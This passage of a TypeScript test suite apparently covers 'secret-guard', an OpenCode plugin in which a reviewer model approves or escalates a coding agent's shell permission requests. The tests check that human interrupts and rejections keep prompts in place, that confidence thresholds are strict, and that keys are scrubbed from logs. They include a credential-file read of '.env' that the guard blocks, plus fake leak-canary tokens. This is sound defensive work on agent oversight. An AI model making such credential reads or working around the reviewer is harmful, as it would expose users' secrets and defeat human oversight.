    ["session.inbox.cancelled", { sessionID: "ses_1", inboxID: "m9" }],
    ["session.inbox.delivered", { sessionID: "ses_1", inboxID: "m9" }],
    ["session.inbox.delivery.changed", { sessionID: "ses_1", inboxID: "m9", delivery: "immediate" }],
  ])("%s during review stays a prompt", async (type, data) => {
    const { fetch, inFlight, release } = gated();
    const fake = await started("auto", { fetch });
    await fake.call(shellCall());
    const running = evaluate(fake);
    await inFlight;
    await fake.events.push(type, data);
    release();
    expect((await running).effect).toBe("ask");
    expect(fake.lines).toEqual(["auto: ask shell (session-event)"]);
  });

  test("a native reject stops review in that session for the rest of the run", async () => {
    const { fetch, inFlight, release } = gated();
    const fake = await started("auto", { fetch });
    await fake.call(shellCall());
    const running = evaluate(fake);
    await inFlight;
    await fake.events.push("permission.replied", { sessionID: "ses_1", requestID: "per_1", reply: "reject" });
    release();
    expect((await running).effect).toBe("ask");
    const retry = await reviewed(fake, shellCall("bun test", "call_2"), evaluation({ source: { type: "tool", messageID: "msg_1", id: "call_2" } }));
    expect(retry.effect).toBe("ask");
    expect(fake.lines.at(-1)).toBe("auto: ask shell (session-rejected)");
    expect(fake.counts.fetch).toBe(1);
  });

  test("once 1,024 sessions have refused, every session stays a prompt", async () => {
    const fake = await started("auto");
    for (let index = 0; index < 1_024; index++) {
      await fake.events.push("permission.replied", { sessionID: `ses_r${index}`, requestID: "p", reply: "reject" });
    }
    expect((await reviewed(fake)).effect).toBe("ask");
    expect(fake.lines).toEqual(["auto: ask shell (session-rejected)"]);
  });

  test("an event for another session leaves the review alone", async () => {
    const { fetch, inFlight, release } = gated();
    const fake = await started("auto", { fetch });
    await fake.call(shellCall());
    const running = evaluate(fake);
    await inFlight;
    await fake.events.push("session.execution.interrupted", { sessionID: "ses_other", reason: "user" });
    release();
    expect((await running).effect).toBe("allow");
  });

  test("a new human message missed by the event stream stays a prompt", async () => {
    let context = HUMAN;
    const fake = await started("auto", {
      context: () => context,
      fetch: async () => {
        context = [...HUMAN, { type: "user", id: "m2", text: "stop, do not run anything" }];
        return response(200, answerBody(APPROVE));
      },
    });
    expect((await reviewed(fake)).effect).toBe("ask");
    expect(fake.lines).toEqual(["auto: ask shell (context-changed)"]);
  });

  test("the same text under a new message id stays a prompt", async () => {
    let context = HUMAN;
    const fake = await started("auto", {
      context: () => context,
      fetch: async () => {
        context = [{ ...HUMAN[0]!, id: "m1-replaced" }, HUMAN[1]!];
        return response(200, answerBody(APPROVE));
      },
    });
    expect((await reviewed(fake)).effect).toBe("ask");
  });

  test("a session moved during review stays a prompt", async () => {
    let session: Record<string, unknown> | undefined;
    const fake = await started("auto", {
      fetch: async () => {
        session = { id: "ses_1", location: { directory: "/elsewhere" } };
        return response(200, answerBody(APPROVE));
      },
    });
    (fake.ctx as any).session.get = async () => session ?? root();
    expect((await reviewed(fake)).effect).toBe("ask");
  });

  test.each(["end", "fail"] as const)("an event stream that %ss stops review", async (how) => {
    const { fetch, inFlight, release } = gated();
    const fake = await started("auto", { fetch });
    await fake.call(shellCall());
    const running = evaluate(fake);
    await inFlight;
    await fake.events.end(how);
    release();
    expect((await running).effect).toBe("ask");
    await fake.call(shellCall("bun test", "call_2"));
    const later = await evaluate(fake, evaluation({ source: { type: "tool", messageID: "msg_1", id: "call_2" } }));
    expect(later.effect).toBe("ask");
    expect(fake.lines.some((line) => line.includes("event stream ended"))).toBe(true);
  });

  test("without an event API the reviewer is unavailable and the guard stays", async () => {
    const fake = await started("auto", { events: false });
    expect(fake.cleanup).toBeUndefined();
    expect(fake.lines[0]).toMatch(/unavailable/);
    expect((await reviewed(fake)).effect).toBe("ask");
    await expect(fake.call({ tool: "read", input: { path: ".env" } })).rejects.toThrow("blocked");
  });

  test("unload aborts in-flight work, the stream and all later reviews", async () => {
    const { fetch, inFlight, release } = gated();
    const fake = await started("auto", { fetch });
    await fake.call(shellCall());
    const running = evaluate(fake);
    await inFlight;
    fake.cleanup!();
    expect(fake.subscribed[0]!.aborted).toBe(true);
    // The late response cannot approve anything.
    release();
    expect((await running).effect).toBe("ask");
    expect((await reviewed(fake, shellCall("bun test", "call_2"), evaluation({ source: { type: "tool", messageID: "msg_1", id: "call_2" } }))).effect).toBe("ask");
    expect(fake.counts.fetch).toBe(1);
  });
});

describe("availability", () => {
  test("a host without the needed APIs keeps the guard and leaves prompts", async () => {
    const lines: string[] = [];
    const fake = host(repo, undefined, { permission: undefined });
    await setupV2(fake.ctx, { ...base, permissionReview: { ...DEFAULT_PERMISSION_REVIEW, mode: "auto" } }, packageLib, { log: (line) => lines.push(line) });
    expect(lines[0]).toMatch(/unavailable/);
    await expect(fake.call({ tool: "read", input: { path: ".env" } })).rejects.toThrow("blocked");
  });

  test("V1 announces that review is unavailable and keeps guarding", () => {
    const written: string[] = [];
    const original = process.stderr.write.bind(process.stderr);
    (process.stderr as any).write = (chunk: any) => (written.push(String(chunk)), true);
    try {
      createV1Hooks({ ...base, permissionReview: { ...DEFAULT_PERMISSION_REVIEW, mode: "auto" } }, packageLib, repo);
    } finally {
      (process.stderr as any).write = original;
    }
    expect(written.join("")).toMatch(/only available on OpenCode V2/);
  });

  test("decide compares negative answers by their complement, so the default boundary passes exactly", () => {
    const answer = (noul: number) => ({ type: "noul" as const, noul });
    const at = (values: Answers, threshold?: number) =>
      decide(Object.fromEntries(Object.entries(values).map(([k, v]) => [k, answer(v)])) as any, threshold);
    const edge = { explicitly_authorized: 0.9, within_scope: 0.9, confirmation_required: 0.1, high_impact: 0.1 };
    expect(at(edge).allow).toBe(true);
    expect(at(edge, 0.9).allow).toBe(true);
    expect(at({ ...edge, high_impact: 0.1000001 }).reason).toBe("model-high-impact");
    expect(at({ ...edge, within_scope: 0.8999999 }).reason).toBe("model-out-of-scope");
    const strict = { explicitly_authorized: 0.95, within_scope: 0.95, confirmation_required: 0.05, high_impact: 0.05 };
    expect(at(strict, 0.95).allow).toBe(true);
    expect(at({ ...strict, confirmation_required: 0.06 }, 0.95).reason).toBe("model-confirmation-required");
    expect(at({ ...strict, explicitly_authorized: 0.94 }, 0.95).reason).toBe("model-not-authorized");
    expect(at(APPROVE, 0.95).allow).toBe(true);
    const certain = { explicitly_authorized: 1, within_scope: 1, confirmation_required: 0, high_impact: 0 };
    expect(at(certain, 1).allow).toBe(true);
    expect(at({ ...certain, within_scope: 0.999 }, 1).allow).toBe(false);
    expect(at({ ...certain, high_impact: 0.001 }, 1).allow).toBe(false);
  });

  test.each([
    [0.9, "allow"],
    [0.95, "ask"],
  ] as const)("a threshold of %d decides a 0.93 answer as %s in auto", async (confidenceThreshold, effect) => {
    const answers = { ...APPROVE, explicitly_authorized: 0.93 };
    const fake = await started("auto", { fetch: async () => response(200, answerBody(answers)) }, {}, { confidenceThreshold });
    expect((await reviewed(fake)).effect).toBe(effect);
    expect(fake.records.at(-1)).toMatchObject({ threshold: confidenceThreshold, reason: effect === "allow" ? "model-approved" : "model-not-authorized" });
    expect(fake.startup).toContain(`threshold ${confidenceThreshold}`);
  });

  test.each([
    [0.93, 0.07],
    [0.66, 0.34],
    [0.9, 0.1],
    [0.95, 0.05],
  ])("at t = %d a negative answer of exactly %d passes and just above asks", (t, limit) => {
    const answer = (noul: number) => ({ type: "noul" as const, noul });
    const at = (values: Answers) =>
      decide(Object.fromEntries(Object.entries(values).map(([k, v]) => [k, answer(v)])) as any, t);
    const edge = { explicitly_authorized: t, within_scope: t, confirmation_required: limit, high_impact: limit };
    expect(at(edge).allow).toBe(true);
    expect(at({ ...edge, high_impact: limit + 1e-9 }).reason).toBe("model-high-impact");
    expect(at({ ...edge, confirmation_required: limit + 1e-9 }).reason).toBe("model-confirmation-required");
  });

  test("at t = 1 any positive negative answer asks, however small", () => {
    const answer = (noul: number) => ({ type: "noul" as const, noul });
    const certain = { explicitly_authorized: answer(1), within_scope: answer(1), confirmation_required: answer(0), high_impact: answer(0) };
    expect(decide(certain as any, 1).allow).toBe(true);
    expect(decide({ ...certain, high_impact: answer(1e-20) } as any, 1).allow).toBe(false);
    expect(decide({ ...certain, confirmation_required: answer(Number.MIN_VALUE) } as any, 1).allow).toBe(false);
  });

  test("decide thresholds are strict", () => {
    const answer = (noul: number) => ({ type: "noul" as const, noul });
    const at = (values: Answers) =>
      decide(Object.fromEntries(Object.entries(values).map(([k, v]) => [k, answer(v)])) as any);
    expect(at(APPROVE).allow).toBe(true);
    expect(at({ ...APPROVE, high_impact: 0.11 }).allow).toBe(false);
    expect(at({ ...APPROVE, within_scope: 0.89 }).allow).toBe(false);
  });
});

describe("observability", () => {
  test.each([
    ["no connection", { connection: null }, "auth-no-connection"],
    ["an unresolved connection", { credential: null }, "auth-unresolved"],
    ["an OAuth credential", { credential: { type: "oauth", access: "a" } }, "auth-not-key"],
    ["an empty key", { credential: { type: "key", key: " " } }, "auth-empty-key"],
    ["a key OpenCode Zen rejects", { fetch: async () => response(401, "{}") }, "auth-rejected"],
    ["another HTTP error", { fetch: async () => response(403, "{}") }, "http-403"],
  ] as Array<[string, World, string]>)("%s has its own reason", async (_, world, reason) => {
    const fake = await started("auto", world);
    expect((await reviewed(fake)).effect).toBe("ask");
    expect(fake.lines).toEqual([`auto: ask shell (${reason})`]);
    expect(fake.records.at(-1)?.reason).toBe(reason);
  });

  test("a failing host credential lookup is reported without its text", async () => {
    const fake = await started("auto");
    (fake.ctx as any).integration.connection.active = async () => {
      throw new Error("internal detail sk-should-not-leak");
    };
    expect((await reviewed(fake)).effect).toBe("ask");
    expect(JSON.stringify([fake.lines, fake.records])).not.toContain("should-not-leak");
    expect(fake.records.at(-1)?.reason).toBe("auth-error");
  });

  test.each([
    ["active", "sync"], ["active", "async"], ["resolve", "sync"], ["resolve", "async"],
  ] as const)("a %s lookup that throws (%s) is auth-error without its text", async (method, how) => {
    const fake = await started("auto");
    (fake.ctx as any).integration.connection[method] = how === "sync"
      ? () => { throw new Error("sk-leaked-detail-abcdefghij"); }
      : async () => { throw new Error("sk-leaked-detail-abcdefghij"); };
    expect((await reviewed(fake)).effect).toBe("ask");
    expect(fake.records.at(-1)?.reason).toBe("auth-error");
    expect(JSON.stringify([fake.lines, fake.records])).not.toContain("leaked");
  });

  test("a stream that ends while hooks register is reported, never announced as started", async () => {
    const lines: string[] = [];
    const records: Array<Record<string, unknown>> = [];
    const fake = host(repo, undefined, {
      event: { subscribe: async () => ({ async *[Symbol.asyncIterator]() {} }) },
      session: { get: async () => root(), context: async () => HUMAN },
      integration: { connection: { active: async () => ({}), resolve: async () => ({ type: "key", key: "k" }) } },
      permission: { hook: () => new Promise((resolve) => setTimeout(resolve, 10)) },
    });
    await setupV2(fake.ctx, { ...base, permissionReview: { ...DEFAULT_PERMISSION_REVIEW, mode: "auto" } }, packageLib, {
      log: (line) => lines.push(line),
      record: (entry) => records.push(entry),
      logPath: "/state/review.jsonl",
    });
    expect(lines.some((line) => line.includes("event stream ended"))).toBe(true);
    expect(lines.some((line) => line.includes("decision log:"))).toBe(false);
    expect(records.map((entry) => entry.event)).toEqual(["unavailable"]);
  });

  test.each(["observe", "auto"] as const)("%s appends remedial guidance to the prompt message", async (mode) => {
    const fake = await started(mode, { connection: null });
    const event = await reviewed(fake, shellCall(), evaluation({ message: "Run tests?" }));
    expect((event as { message?: string }).message).toMatch(
      /^Run tests\?\nsecret-guard review: manual approval \(auth-no-connection\): no active OpenCode Zen connection; connect/,
    );
  });

  test("an approval in auto adds no message", async () => {
    const fake = await started("auto");
    expect((await reviewed(fake)) as { message?: string }).not.toHaveProperty("message");
  });

  test("records correlate the call without its content", async () => {
    const fake = await started("observe");
    await reviewed(fake);
    expect(fake.startup).toBe(`observe with ${SYSTEM_ONE_MODEL}, threshold 0.9; decision log: /state/review.jsonl`);
    expect(fake.records[0]).toEqual({ time: expect.any(String), pid: process.pid, mode: "observe", event: "start", model: SYSTEM_ONE_MODEL, threshold: 0.9, logPayloads: false });
    const entry = fake.records.at(-1)!;
    expect(entry).toMatchObject({
      event: "review",
      mode: "observe",
      action: "shell",
      proposed: "allow",
      applied: "ask",
      reason: "model-approved",
      sessionID: "ses_1",
      messageID: "msg_1",
      callID: "call_1",
    });
    expect(typeof entry.elapsedMs).toBe("number");
    expect(typeof entry.time).toBe("string");
    const text = JSON.stringify(fake.records);
    for (const secret of ["bun test", "test-key", repo, "/state/review.jsonl", HUMAN[0]!.text]) expect(text).not.toContain(secret);
  });

  test("a failing log cannot change a decision", async () => {
    const fake = await started("auto", {}, {
      record: () => {
        throw new Error("disk full");
      },
    });
    expect((await reviewed(fake)).effect).toBe("allow");
    await reviewed(fake, shellCall("bun test", "call_2"), evaluation({ source: { type: "tool", messageID: "msg_1", id: "call_2" } }));
    const notices = fake.lines.filter((line) => line.startsWith("review log unavailable at /state/review.jsonl"));
    expect(notices).toHaveLength(1);
    expect(fake.startup).not.toMatch(/logged/);
    expect(fake.lines.join("")).not.toContain("disk full");
  });

  test("off creates no log", async () => {
    const state = path.join(fixture, "off-state");
    process.env.XDG_STATE_HOME = state;
    try {
      await setupV2(host(repo).ctx, base, packageLib);
      expect(fs.existsSync(state)).toBe(false);
    } finally {
      process.env.XDG_STATE_HOME = path.join(fixture, "state");
    }
  });
});

describe("a failing decision log on the prompt", () => {
  const failing = () => {
    let fail = true;
    return {
      record: () => {
        if (fail) throw new Error("ENOSPC /secret/path");
      },
      recover: () => (fail = false),
    };
  };
  const ui = () => {
    const shown: any[] = [];
    return { shown, listen: createTuiListener({ toast: { show: (options) => shown.push(options) } }) };
  };
  const asked = (message: unknown, id = "per_1") => ({ data: { id, sessionID: "ses_1", message } });

  test("with an auth reason, both warnings show and the prompt stays", async () => {
    const log = failing();
    const fake = await started("auto", { connection: null }, { record: log.record });
    const event = (await reviewed(fake)) as { effect: string; message?: string };
    expect(event.effect).toBe("ask");
    expect(event.message!.split("\n")).toEqual([
      expect.stringMatching(/^secret-guard review: manual approval \(auth-no-connection\)/),
      "secret-guard log: unavailable",
    ]);
    const { shown, listen } = ui();
    listen(asked(event.message));
    expect(shown.map((toast) => toast.message)).toEqual([
      expect.stringMatching(/^The decision log cannot be written/),
      expect.stringMatching(/^Manual approval required: no active OpenCode Zen connection/),
    ]);
    expect(JSON.stringify(shown)).not.toMatch(/ENOSPC|secret\/path/);
  });

  test("in observe, would-allow and the log warning both show; the prompt stays", async () => {
    const fake = await started("observe", {}, { record: failing().record });
    const event = (await reviewed(fake)) as { effect: string; message?: string };
    expect(event.effect).toBe("ask");
    const { shown, listen } = ui();
    listen(asked(event.message));
    expect(shown.map((toast) => toast.variant)).toEqual(["warning", "info"]);
  });

  test("an auto approval is unchanged and has no prompt to carry a warning", async () => {
    const fake = await started("auto", {}, { record: failing().record });
    const event = (await reviewed(fake)) as { effect: string; message?: string };
    expect(event.effect).toBe("allow");
    expect(event.message).toBeUndefined();
  });

  test("a recovered log clears the warning", async () => {
    const log = failing();
    const fake = await started("auto", { connection: null }, { record: log.record });
    expect(((await reviewed(fake)) as { message?: string }).message).toContain("secret-guard log: unavailable");
    log.recover();
    const next = await reviewed(fake, shellCall("bun test", "call_2"), evaluation({ source: { type: "tool", messageID: "msg_1", id: "call_2" } }));
    expect((next as { message?: string }).message).not.toContain("secret-guard log");
  });
});

describe("payload log", () => {
  const phases = (fake: Fake) => fake.payloads.map((entry) => entry.phase);

  test("is off by default: nothing is traced", async () => {
    const fake = await started("auto");
    expect((await reviewed(fake)).effect).toBe("allow");
    expect(fake.payloads).toEqual([]);
    expect(fake.payloadStartup).toBeUndefined();
    expect(fake.records.at(-1)?.reviewID).toEqual(expect.any(String));
  });

  test("records the exact request body and the response, correlated with the decision", async () => {
    const fake = await started("observe", {}, {}, { logPayloads: true });
    await reviewed(fake);
    expect(fake.payloadStartup).toBe("request and response bodies are logged to /state/payloads.jsonl");
    expect(phases(fake)).toEqual(["request", "response"]);
    const [request, reply] = fake.payloads;
    expect(request.body).toBe(fake.requests[0].init.body);
    expect(request).toMatchObject({ event: "payload", sessionID: "ses_1", messageID: "msg_1", callID: "call_1", model: SYSTEM_ONE_MODEL });
    expect(reply).toMatchObject({ status: 200, body: answerBody(APPROVE), omitted: null });
    const decision = fake.records.at(-1)!;
    expect(request.reviewID).toBe(decision.reviewID);
    expect(reply.reviewID).toBe(decision.reviewID);
    // The command and the user's text are in the payload log only.
    expect(String(request.body)).toContain("Please run the test suite");
    expect(JSON.stringify(fake.records)).not.toMatch(/bun test|Please run/);
    expect(JSON.stringify(fake.payloads)).not.toMatch(/test-key|[Aa]uthorization|Bearer/);
  });

  test.each([
    ["a malformed body", response(200, "not json"), "response-json", 200, "not json"],
    ["a rejected key echoed back", response(401, '{"error":"bad key test-key"}'), "auth-rejected", 401, '{"error":"bad key [redacted]"}'],
    ["a server error", response(500, "overloaded"), "http-500", 500, "overloaded"],
  ] as const)("logs %s, bounded and scrubbed", async (_, reply, reason, status, body) => {
    const fake = await started("auto", { fetch: async () => reply as any }, {}, { logPayloads: true });
    expect((await reviewed(fake)).effect).toBe("ask");
    expect(fake.records.at(-1)?.reason).toBe(reason);
    expect(fake.payloads.at(-1)).toMatchObject({ phase: "response", status, body, omitted: null });
    expect(JSON.stringify(fake.payloads)).not.toContain("test-key");
  });

  test("an oversized response is cut at the response limit and marked", async () => {
    const fake = await started("auto", { fetch: async () => response(200, "x".repeat(100_000)) as any }, {}, { logPayloads: true });
    expect((await reviewed(fake)).effect).toBe("ask");
    expect(fake.records.at(-1)?.reason).toBe("response-oversize");
    const reply = fake.payloads.at(-1)!;
    // No prefix is kept: a cut could split the key past the scrub.
    expect(reply).toMatchObject({ phase: "response", body: "", omitted: "oversize" });
  });

  test("a key with JSON-escaped characters is removed raw and escaped", async () => {
    const key = 'synthetic"key\\x';
    const echo = `raw ${key} escaped ${JSON.stringify(key)}`;
    const fake = await started(
      "auto",
      { credential: { type: "key", key }, fetch: async () => response(401, echo) as any },
      {},
      { logPayloads: true },
    );
    await reviewed(fake);
    const logged = JSON.stringify(fake.payloads.map((entry) => entry.body));
    expect(fake.payloads.at(-1)!.body).toContain("[redacted]");
    expect(logged).not.toContain("synthetic");
  });

  test("a hung error body ends at the deadline and is marked", async () => {
    const hung = { ...response(503, ""), body: { getReader: () => ({ read: () => new Promise(() => {}), cancel: async () => {} }), cancel: async () => {} } };
    const fake = await started("auto", { fetch: async () => hung as any }, { deadlineMs: 20 }, { logPayloads: true });
    expect((await reviewed(fake)).effect).toBe("ask");
    expect(fake.records.at(-1)?.reason).toBe("http-503");
    expect(fake.payloads.at(-1)).toMatchObject({ phase: "response", status: 503, body: "", omitted: "deadline" });
  });

  test("a hung request is traced as a deadline", async () => {
    const fake = await started("auto", { fetch: () => new Promise(() => {}) }, { deadlineMs: 20 }, { logPayloads: true });
    await reviewed(fake);
    expect(fake.records.at(-1)?.reason).toBe("deadline");
    expect(fake.payloads.at(-1)).toMatchObject({ phase: "failure", reason: "deadline" });
  });

  test("a cancelled review is traced with its cause, not as a timeout", async () => {
    let entered = () => {};
    const inFlight = new Promise<void>((resolve) => (entered = resolve));
    const fake = await started("auto", { fetch: () => (entered(), new Promise(() => {})) }, {}, { logPayloads: true });
    await fake.call(shellCall());
    const running = evaluate(fake);
    await inFlight;
    await fake.events.push("session.deleted", { sessionID: "ses_1" });
    expect((await running).effect).toBe("ask");
    expect(fake.records.at(-1)?.reason).toBe("session-event");
    expect(fake.payloads.at(-1)).toMatchObject({ phase: "failure", reason: "session-event" });
  });

  test("a declared oversized response is not read", async () => {
    const big = response(200, "x".repeat(10), { "content-length": "999999" });
    const fake = await started("auto", { fetch: async () => big as any }, {}, { logPayloads: true });
    await reviewed(fake);
    expect(fake.payloads.at(-1)).toMatchObject({ phase: "response", body: "", omitted: "declared-oversize" });
  });

  test("a network failure is a failure record without its text and no response", async () => {
    const fake = await started("auto", { fetch: async () => { throw new Error("connect failed test-key"); } }, {}, { logPayloads: true });
    expect((await reviewed(fake)).effect).toBe("ask");
    expect(phases(fake)).toEqual(["request", "failure"]);
    expect(fake.payloads.at(-1)).toMatchObject({ reason: "network" });
    expect(JSON.stringify(fake.payloads)).not.toContain("connect failed");
  });

  test("no request is logged when none is sent", async () => {
    const fake = await started("auto", { connection: null }, {}, { logPayloads: true });
    await reviewed(fake);
    expect(fake.counts.fetch).toBe(0);
    expect(fake.payloads).toEqual([]);
  });

  test("with the mode off, logPayloads does nothing", async () => {
    const touched: string[] = [];
    const fake = host(repo, undefined, {});
    await setupV2(fake.ctx, { ...base, permissionReview: { mode: "off", logPayloads: true, confidenceThreshold: 0.9 } }, packageLib, {
      record: () => touched.push("record"),
      recordPayload: () => touched.push("payload"),
      log: () => touched.push("log"),
    });
    expect(touched).toEqual([]);
  });

  test("concurrent reviews keep their own correlation", async () => {
    let release = () => {};
    const gate = new Promise<void>((resolve) => (release = resolve));
    const fake = await started("observe", { fetch: async () => (await gate, response(200, answerBody(APPROVE)) as any) }, {}, { logPayloads: true });
    await fake.call(shellCall("bun test", "call_1"));
    await fake.call(shellCall("bun test", "call_2"));
    const both = Promise.all([
      evaluate(fake, evaluation()),
      evaluate(fake, evaluation({ source: { type: "tool", messageID: "msg_1", id: "call_2" } })),
    ]);
    await new Promise((resolve) => setTimeout(resolve, 5));
    release();
    await both;
    const ids = new Set(fake.records.filter((entry) => entry.event === "review").map((entry) => entry.reviewID));
    expect(ids.size).toBe(2);
    for (const decision of fake.records.filter((entry) => entry.event === "review")) {
      const mine = fake.payloads.filter((entry) => entry.reviewID === decision.reviewID);
      expect(mine.map((entry) => entry.phase)).toEqual(["request", "response"]);
      expect(mine.every((entry) => entry.callID === decision.callID)).toBe(true);
    }
  });

  test("a failing payload log is named on the prompt and never changes the decision", async () => {
    const fail = () => {
      throw new Error("EACCES /secret/path");
    };
    const auto = await started("auto", {}, { recordPayload: fail }, { logPayloads: true });
    expect((await reviewed(auto)).effect).toBe("allow");
    const fake = await started("auto", { connection: null }, { recordPayload: fail }, { logPayloads: true });
    expect(((await reviewed(fake)) as { message?: string }).message).not.toContain("payloads unavailable");
    const observe = await started("observe", {}, { recordPayload: fail }, { logPayloads: true });
    const event = (await reviewed(observe)) as { effect: string; message?: string };
    expect(event.effect).toBe("ask");
    expect(event.message!.split("\n")).toEqual([expect.stringMatching(/would allow/), "secret-guard log: payloads unavailable"]);
    expect(observe.lines.filter((line) => line.startsWith("payload log unavailable at /state/payloads.jsonl"))).toHaveLength(1);
    const shown: any[] = [];
    createTuiListener({ toast: { show: (options) => shown.push(options) } })({ data: { id: "per_9", sessionID: "ses_1", message: event.message } });
    expect(shown.map((toast) => toast.message)).toEqual([expect.stringMatching(/^The payload log/), expect.stringMatching(/^Observe mode/)]);
    expect(JSON.stringify([shown, observe.lines])).not.toMatch(/EACCES|secret\/path/);
  });

  test.each([false, true])("a real review with logPayloads %p writes the payload file only when enabled", async (logPayloads) => {
    const dir = fs.mkdtempSync(path.join(fixture, "real-"));
    const decisions = path.join(dir, "state", "permission-review.jsonl");
    const payloadFile = path.join(dir, "state", "permission-review-payloads.jsonl");
    const fake = await started("observe", {}, {
      record: fileReviewLog(decisions),
      logPath: decisions,
      recordPayload: fileReviewLog(payloadFile, PAYLOAD_LOG_LIMITS),
      payloadLogPath: payloadFile,
    }, { logPayloads });
    await reviewed(fake);
    const decisionText = fs.readFileSync(decisions, "utf8");
    expect(decisionText).not.toMatch(/bun test|Please run|test-key/);
    expect(fs.existsSync(payloadFile)).toBe(logPayloads);
    if (!logPayloads) return;
    const lines = fs.readFileSync(payloadFile, "utf8").trim().split("\n").map((line) => JSON.parse(line));
    expect(lines.map((line) => line.phase)).toEqual(["request", "response"]);
    expect(lines[0].body).toBe(fake.requests[0].init.body);
    expect(lines[1].body).toBe(answerBody(APPROVE));
    expect(fs.readFileSync(payloadFile, "utf8")).not.toMatch(/test-key|Bearer/);
    expect((fs.statSync(payloadFile).mode & 0o777).toString(8)).toBe("600");
  });

  test("the file writer takes payload-sized records in its own file", () => {
    expect(path.dirname(payloadLogPath())).toBe(path.dirname(reviewLogPath()));
    const file = path.join(fixture, "payload-state", "payloads.jsonl");
    const write = fileReviewLog(file, PAYLOAD_LOG_LIMITS);
    write({ body: "y".repeat(200_000) });
    expect(() => write({ body: "y".repeat(PAYLOAD_LOG_LIMITS.maxRecordBytes) })).toThrow(/oversize/);
    expect(() => fileReviewLog(path.join(fixture, "payload-state", "decisions.jsonl"))({ body: "y".repeat(5_000) })).toThrow(/oversize/);
    expect(fs.readFileSync(file, "utf8").split("\n").filter(Boolean)).toHaveLength(1);
  });
});

describe("review log file", () => {
  const dir = () => {
    const made = fs.mkdtempSync(path.join(fixture, "log-"));
    fs.chmodSync(made, 0o700);
    return made;
  };

  test("appends readable private JSON lines", () => {
    const file = path.join(dir(), "nested", "review.jsonl");
    const write = fileReviewLog(file);
    write({ event: "a" });
    write({ event: "b" });
    expect(fs.readFileSync(file, "utf8").trim().split("\n").map((line) => JSON.parse(line).event)).toEqual(["a", "b"]);
    expect(fs.statSync(file).mode & 0o777).toBe(0o600);
    expect(fs.statSync(path.dirname(file)).mode & 0o777).toBe(0o700);
  });

  test("stays bounded by keeping one previous generation", () => {
    const file = path.join(dir(), "review.jsonl");
    const write = fileReviewLog(file);
    const record = { pad: "x".repeat(4_000) };
    for (let i = 0; i < 600; i++) write(record);
    expect(fs.statSync(file).size).toBeLessThanOrEqual(MAX_LOG_BYTES);
    expect(fs.statSync(`${file}.1`).size).toBeLessThanOrEqual(MAX_LOG_BYTES);
    expect(fs.readdirSync(path.dirname(file)).sort()).toEqual(["review.jsonl", "review.jsonl.1"]);
  });

  test("refuses a symlink or a hard link at the log path", () => {
    const where = dir();
    const target = path.join(where, "target");
    fs.writeFileSync(target, "keep\n");
    const file = path.join(where, "review.jsonl");
    fs.symlinkSync(target, file);
    expect(() => fileReviewLog(file)({ event: "x" })).toThrow();
    fs.unlinkSync(file);
    fs.linkSync(target, file);
    expect(() => fileReviewLog(file)({ event: "x" })).toThrow();
    expect(fs.readFileSync(target, "utf8")).toBe("keep\n");
  });

  test("refuses a FIFO without blocking", () => {
    const file = path.join(dir(), "review.jsonl");
    expect(spawnSync("mkfifo", [file]).status).toBe(0);
    // Opening a FIFO for writing without a reader would block forever.
    expect(() => fileReviewLog(file)({ event: "x" })).toThrow();
  });

  test("refuses an existing log or directory others can read, without changing it", () => {
    const where = dir();
    const file = path.join(where, "review.jsonl");
    fs.writeFileSync(file, "", { mode: 0o644 });
    fs.chmodSync(file, 0o644);
    fs.chmodSync(where, 0o700);
    expect(() => fileReviewLog(file)({ event: "x" })).toThrow();
    expect(fs.statSync(file).mode & 0o777).toBe(0o644);
    fs.chmodSync(file, 0o600);
    fs.chmodSync(where, 0o755);
    expect(() => fileReviewLog(file)({ event: "x" })).toThrow();
    expect(fs.readFileSync(file, "utf8")).toBe("");
  });

  test("rotation keeps whole records in order across both generations", () => {
    const file = path.join(dir(), "review.jsonl");
    const write = fileReviewLog(file);
    const pad = "x".repeat(3_000);
    let n = 0;
    while (!fs.existsSync(`${file}.1`)) write({ n: n++, pad });
    write({ n: n++, pad });
    const read = (name: string) => fs.readFileSync(name, "utf8").trim().split("\n").map((line) => JSON.parse(line).n);
    const previous = read(`${file}.1`);
    expect([...previous, ...read(file)]).toEqual([...Array(n).keys()]);
    const lineBytes = Buffer.byteLength(`${JSON.stringify({ n: 0, pad })}\n`);
    expect(fs.statSync(`${file}.1`).size + lineBytes).toBeGreaterThan(MAX_LOG_BYTES);
    expect(fs.statSync(`${file}.1`).size).toBeLessThanOrEqual(MAX_LOG_BYTES);
  });

  test("a rotation that cannot rename fails without touching either path", () => {
    const file = path.join(dir(), "review.jsonl");
    const write = fileReviewLog(file);
    write({ n: 0 });
    const full = "a".repeat(MAX_LOG_BYTES);
    fs.writeFileSync(file, full);
    fs.mkdirSync(`${file}.1`);
    fs.writeFileSync(path.join(`${file}.1`, "kept"), "");
    expect(() => write({ pad: "x".repeat(4_000) })).toThrow();
    expect(fs.readFileSync(file, "utf8")).toBe(full);
    expect(fs.readdirSync(`${file}.1`)).toEqual(["kept"]);
  });

  test("a relative XDG_STATE_HOME is ignored", () => {
    const saved = process.env.XDG_STATE_HOME;
    process.env.XDG_STATE_HOME = "relative-state";
    try {
      expect(reviewLogPath()).toBe(path.join(os.homedir(), ".local", "state", "opencode-secret-guard", "permission-review.jsonl"));
    } finally {
      process.env.XDG_STATE_HOME = saved;
    }
  });

  test("refuses an oversize record", () => {
    const file = path.join(dir(), "review.jsonl");
    expect(() => fileReviewLog(file)({ pad: "é".repeat(3_000) })).toThrow("oversize");
  });
});

describe("TUI companion", () => {
  /** The v2.0.20 `permission.asked` event: its data is the permission request. */
  const asked = (message: string | undefined, id = "per_1") => ({
    type: "permission.asked",
    data: { id, sessionID: "ses_1", action: "shell", resources: ["bun test --token=sk-abcdefghijklmnopqrstu"], source: { type: "tool", messageID: "msg_1", id: "call_1" }, message },
  });
  const toasts = () => {
    const shown: any[] = [];
    let clock = 0;
    const listen = createTuiListener({ toast: { show: (options) => shown.push(options) } }, () => clock);
    return { shown, listen, advance: (ms: number) => (clock += ms) };
  };
  const serverNote = async (mode: PermissionReviewMode, world: World) => {
    const fake = await started(mode, world);
    return ((await reviewed(fake, shellCall(), evaluation({ message: "Run bun test?" }))) as { message?: string }).message;
  };

  test("an auth reason from the server becomes one fixed warning", async () => {
    const message = await serverNote("auto", { connection: null });
    const { shown, listen } = toasts();
    listen(asked(message));
    expect(shown).toEqual([{
      title: "Secret guard review",
      message: "Manual approval required: no active OpenCode Zen connection; connect OpenCode Zen with an API key in OpenCode, then retry.",
      variant: "warning",
      duration: 8_000,
      sessionID: "ses_1",
    }]);
    expect(JSON.stringify(shown)).not.toMatch(/bun test|sk-|Run bun/);
  });

